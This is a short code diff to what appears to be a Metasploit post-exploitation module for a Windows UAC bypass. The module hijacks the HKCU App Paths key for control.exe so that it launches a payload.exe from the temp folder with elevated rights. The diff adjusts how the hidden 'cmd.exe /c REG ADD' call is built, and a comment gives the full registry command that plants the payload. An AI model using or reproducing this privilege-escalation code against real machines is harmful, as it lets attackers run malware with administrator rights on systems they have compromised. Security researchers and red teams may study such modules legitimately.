@@ -177,7 +177,7 @@ def ls_hijack
   pay_name = datastore['PAYLOAD_NAME'] # payload.exe
   uac_level = "ConsentPromptBehaviorAdmin" # uac level registry key
   uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
-  regi_hive = "REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe" # registry hive key to be hijacked
+  regi_hive = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe" # registry hive key to be hijacked
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
@@ -250,7 +250,7 @@ def ls_hijack
         # REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe /ve /t REG_SZ /d %temp%\\payload.exe /f
         #
         print_good(" exec => Hijacking process to gain code execution ..")
-        r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
+        r = session.sys.process.execute("cmd.exe /c REG ADD #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
         # give a proper time to refresh regedit 'enigma0x3' :D
         Rex::sleep(4.5)
 
